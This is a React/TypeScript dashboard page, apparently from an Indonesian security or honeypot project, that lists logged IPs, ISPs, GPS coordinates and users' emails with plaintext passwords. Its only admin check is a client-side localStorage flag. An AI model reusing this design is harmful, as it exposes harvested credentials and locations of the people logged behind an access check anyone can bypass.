import { useEffect, useState } from "react";
import { TopBar } from "../components/TopBar";

interface LogData {
  id: number;
  event_type: string;
  client_ip: string;
  city: string;
  isp: string;
  email: string;
  password: string;
  latitude: string;
  longitude: string;
  access_time: string;
}

type SortField = "access_time" | "event_type" | "client_ip";
type SortOrder = "asc" | "desc";

export default function BlueTeam() {
  // ==========================================
  // KUNCI ADMIN (Hanya bisa diakses Admin)
  // ==========================================
  const isAdmin = localStorage.getItem('isAdmin') === 'true';
  
  if (!isAdmin) {
    return (
      <div className="flex h-screen items-center justify-center bg-slate-900 text-white">
        <div className="text-center p-8 bg-slate-800 rounded-xl border border-red-500/30">
          <h1 className="text-2xl font-bold text-red-500 mb-2">Akses Ditolak</h1>
          <p className="text-slate-400">Halaman ini hanya untuk Administrator.</p>
          <a href="/admin" className="mt-4 inline-block text-blue-400 hover:underline">Login Admin</a>
        </div>
      </div>
    );
  }

  const [logs, setLogs] = useState<LogData[]>([]);
  const [searchTerm, setSearchTerm] = useState("");
  const [error, setError] = useState<string | null>(null);

  // State untuk Sorting
  const [sortField, setSortField] = useState<SortField>("access_time");
  const [sortOrder, setSortOrder] = useState<SortOrder>("desc");

  useEffect(() => {
    const fetchLogs = () => {
      fetch("/api/v1/logs")
        .then((res) => {
          if (!res.ok) throw new Error("Gagal mengambil data");
          return res.json();
        })
        .then((data) => {
          setLogs(data);
          setError(null);
        })
        .catch(() => setError("Backend belum terhubung."));
    };

    fetchLogs();
    const interval = setInterval(fetchLogs, 5000); // Live update tiap 5 detik
    return () => clearInterval(interval);
  }, []);

  const handleSort = (field: SortField) => {
    if (sortField === field) {
      setSortOrder(sortOrder === "asc" ? "desc" : "asc");
    } else {
      setSortField(field);
      setSortOrder("asc");
    }
  };

  const filteredLogs = logs.filter((log) => 
    (log.client_ip && log.client_ip.includes(searchTerm)) || 
    (log.event_type && log.event_type.toLowerCase().includes(searchTerm.toLowerCase())) ||
    (log.city && log.city.toLowerCase().includes(searchTerm.toLowerCase())) ||
    (log.email && log.email.toLowerCase().includes(searchTerm.toLowerCase()))
  );

  const sortedLogs = [...filteredLogs].sort((a, b) => {
    let valA: any = a[sortField] || "";
    let valB: any = b[sortField] || "";

    if (sortField === "access_time") {
      valA = new Date(a.access_time.replace(" WITA", "").split("-").reverse().join("-")).getTime() || a.access_time;
      valB = new Date(b.access_time.replace(" WITA", "").split("-").reverse().join("-")).getTime() || b.access_time;
    }
    if (valA < valB) return sortOrder === "asc" ? -1 : 1;
    if (valA > valB) return sortOrder === "asc" ? 1 : -1;
    return 0;
  });

  const totalGpsEvents = logs.filter((l) => l.event_type === "GPS_LOGIN").length;
  const uniqueIps = new Set(logs.map((l) => l.client_ip)).size;

  return (
    <div className="h-screen flex flex-col bg-slate-900 text-slate-100 font-sans overflow-hidden">
      <TopBar title="Blue Team Operation Center" />
      
      <main className="flex-1 p-6 flex flex-col min-h-0 gap-6">
        {/* Metric / Quick Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <div className="bg-slate-800/80 border border-slate-700/60 rounded-xl p-4 flex items-center justify-between shadow-lg backdrop-blur-sm">
            <div>
              <p className="text-xs font-medium text-slate-400 uppercase tracking-wider">Total Logs</p>
              <h3 className="text-2xl font-bold text-white mt-1">{logs.length}</h3>
            </div>
            <div className="p-3 bg-blue-500/10 text-blue-400 rounded-lg border border-blue-500/20">
              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
              </svg>
            </div>
          </div>

          <div className="bg-slate-800/80 border border-slate-700/60 rounded-xl p-4 flex items-center justify-between shadow-lg backdrop-blur-sm">
            <div>
              <p className="text-xs font-medium text-slate-400 uppercase tracking-wider">GPS Login Alerts</p>
              <h3 className="text-2xl font-bold text-rose-400 mt-1">{totalGpsEvents}</h3>
            </div>
            <div className="p-3 bg-rose-500/10 text-rose-400 rounded-lg border border-rose-500/20">
              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
              </svg>
            </div>
          </div>

          <div className="bg-slate-800/80 border border-slate-700/60 rounded-xl p-4 flex items-center justify-between shadow-lg backdrop-blur-sm">
            <div>
              <p className="text-xs font-medium text-slate-400 uppercase tracking-wider">Unique IP Addresses</p>
              <h3 className="text-2xl font-bold text-emerald-400 mt-1">{uniqueIps}</h3>
            </div>
            <div className="p-3 bg-emerald-500/10 text-emerald-400 rounded-lg border border-emerald-500/20">
              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9" />
              </svg>
            </div>
          </div>
        </div>

        {/* Header & Search Bar */}
        <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 bg-slate-800/40 p-4 rounded-xl border border-slate-700/40">
          <div>
            <h2 className="text-lg font-bold text-white flex items-center gap-2">
              <span className="relative flex h-3 w-3">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                <span className="relative inline-flex rounded-full h-3 w-3 bg-emerald-500"></span>
              </span>
              Security Logs
            </h2>
            <p className="text-xs text-slate-400 mt-0.5">Live telemetry monitoring system (IP, GPS, & Events).</p>
          </div>
          
          <div className="relative w-full md:w-80">
            <svg className="absolute left-3.5 top-2.5 h-4 w-4 text-slate-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
            </svg>
            <input
              type="text"
              placeholder="Cari IP, Kota, Email, Event..."
              className="w-full pl-10 pr-10 py-2 bg-slate-900/90 border border-slate-700 rounded-lg text-sm text-slate-200 placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
            />
            {searchTerm && (
              <button 
                onClick={() => setSearchTerm("")} 
                className="absolute right-3 top-2.5 text-slate-500 hover:text-slate-300 transition-colors"
              >
                ✕
              </button>
            )}
          </div>
        </div>

        {/* Error Alert */}
        {error && (
          <div className="rounded-xl bg-rose-500/10 p-4 text-sm text-rose-300 border border-rose-500/30 flex items-center gap-3">
            <svg className="w-5 h-5 text-rose-400 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            <span>{error}</span>
          </div>
        )}

        {/* Log Table Container */}
        <div className="flex-1 bg-slate-800/80 rounded-xl shadow-xl border border-slate-700/60 overflow-hidden flex flex-col min-h-0 backdrop-blur-sm">
          <div className="overflow-auto flex-1 scrollbar-thin scrollbar-thumb-slate-700 scrollbar-track-transparent">
            <table className="w-full text-sm text-left text-slate-300">
              <thead className="bg-slate-900/90 sticky top-0 z-10 border-b border-slate-700 uppercase text-xs tracking-wider text-slate-400 backdrop-blur-md">
                <tr>
                  <th onClick={() => handleSort("access_time")} className="px-5 py-3.5 font-semibold cursor-pointer hover:text-white transition-colors select-none group">
                    <div className="flex items-center gap-1.5">
                      Waktu Access
                      <span className="text-blue-400 font-bold">
                        {sortField === "access_time" ? (sortOrder === "asc" ? "▲" : "▼") : <span className="text-slate-600 group-hover:text-slate-400">↕</span>}
                      </span>
                    </div>
                  </th>
                  <th onClick={() => handleSort("event_type")} className="px-5 py-3.5 font-semibold cursor-pointer hover:text-white transition-colors select-none group">
                    <div className="flex items-center gap-1.5">
                      Event Type
                      <span className="text-blue-400 font-bold">
                        {sortField === "event_type" ? (sortOrder === "asc" ? "▲" : "▼") : <span className="text-slate-600 group-hover:text-slate-400">↕</span>}
                      </span>
                    </div>
                  </th>
                  <th onClick={() => handleSort("client_ip")} className="px-5 py-3.5 font-semibold cursor-pointer hover:text-white transition-colors select-none group">
                    <div className="flex items-center gap-1.5">
                      IP Address
                      <span className="text-blue-400 font-bold">
                        {sortField === "client_ip" ? (sortOrder === "asc" ? "▲" : "▼") : <span className="text-slate-600 group-hover:text-slate-400">↕</span>}
                      </span>
                    </div>
                  </th>
                  <th className="px-5 py-3.5 font-semibold">Detail (Lokasi / Kredensial)</th>
                  <th className="px-5 py-3.5 font-semibold">Kredensial</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-700/40">
                {sortedLogs.map((log) => {
                  const isGpsEvent = log.event_type === "GPS_LOGIN";
                  const mapsUrl = log.latitude && log.longitude 
                    ? `https://maps.google.com/?q=${log.latitude},${log.longitude}` 
                    : null;

                  return (
                    <tr key={log.id} className="hover:bg-slate-700/30 transition-colors">
                      <td className="px-5 py-3.5 whitespace-nowrap text-xs font-mono text-slate-400">
                        {log.access_time}
                      </td>
                      <td className="px-5 py-3.5 whitespace-nowrap">
                        <span className={`inline-flex items-center px-2.5 py-1 rounded-md text-xs font-bold tracking-wide border ${
                          isGpsEvent
                            ? "bg-rose-500/10 text-rose-400 border-rose-500/30" 
                            : "bg-blue-500/10 text-blue-400 border-blue-500/30"
                        }`}>
                          <span className={`w-1.5 h-1.5 rounded-full mr-1.5 ${isGpsEvent ? "bg-rose-400 animate-pulse" : "bg-blue-400"}`}></span>
                          {log.event_type}
                        </span>
                      </td>
                      <td className="px-5 py-3.5 font-mono text-xs font-medium text-slate-200">
                        <span className="bg-slate-900/60 px-2 py-1 rounded border border-slate-700/80">
                          {log.client_ip}
                        </span>
                      </td>
                      <td className="px-5 py-3.5">
                        {isGpsEvent ? (
                          <div className="flex flex-col gap-1">
                            <div className="flex items-center gap-1.5 font-medium text-rose-300 text-xs">
                              <svg className="w-3.5 h-3.5 text-rose-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 12a4 4 0 10-8 0 4 4 0 008 0zm0 0v1.5a2.5 2.5 0 005 0V12a9 9 0 10-9 9m4.5-1.206a8.959 8.959 0 01-4.5 1.207" />
                              </svg>
                              <span>{log.email}</span>
                            </div>
                            {mapsUrl && (
                              <a href={mapsUrl} target="_blank" rel="noreferrer" className="inline-flex items-center gap-1 text-[11px] text-slate-400 hover:text-blue-400 font-mono transition-colors">
                                <svg className="w-3 h-3 text-slate-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
                                </svg>
                                GPS: {log.latitude}, {log.longitude}
                              </a>
                            )}
                          </div>
                        ) : (
                          <div className="flex items-center gap-2 text-slate-300">
                            <span className="font-medium text-slate-200">{log.city || "Unknown City"}</span>
                            {log.isp && (
                              <>
                                <span className="text-slate-600">•</span>
                                <span className="text-xs text-slate-400 bg-slate-900/40 px-2 py-0.5 rounded border border-slate-700/40">
                                  {log.isp}
                                </span>
                              </>
                            )}
                          </div>
                        )}
                      </td>
                      
                      {/* KOLOM KREDENSIAL BARU */}
                      <td className="px-5 py-3.5">
                        {log.email && log.email !== "Tidak diisi" ? (
                          <div className="flex flex-col gap-1">
                            <span className="text-xs text-blue-300 font-medium">👤 {log.email}</span>
                            <span className="text-xs text-rose-300 font-mono">🔑 {log.password}</span>
                          </div>
                        ) : (
                          <span className="text-slate-500 text-xs italic">-</span>
                        )}
                      </td>
                    </tr>
                  );
                })}

                {sortedLogs.length === 0 && !error && (
                  <tr>
                    <td colSpan={5} className="px-5 py-16 text-center text-slate-500">
                      <div className="flex flex-col items-center gap-2">
                        <svg className="w-10 h-10 text-slate-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                        </svg>
                        <p className="text-sm font-medium">Tidak ada security log yang ditemukan</p>
                        {searchTerm && (
                          <p className="text-xs text-slate-600">
                            Pencarian untuk <span className="text-slate-400 font-mono">"{searchTerm}"</span> tidak cocok dengan log manapun.
                          </p>
                        )}
                      </div>
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
          
          {/* Footer Tabel */}
          <div className="bg-slate-900/90 border-t border-slate-700/80 px-5 py-2.5 text-xs text-slate-400 flex justify-between items-center">
            <span className="flex items-center gap-1.5">
              <span className="w-2 h-2 rounded-full bg-emerald-500"></span>
              Live Monitoring Active
            </span>
            <span>
              Menampilkan <strong className="text-slate-200">{sortedLogs.length}</strong> dari {logs.length} log
            </span>
          </div>
        </div>
      </main>
    </div>
  );
}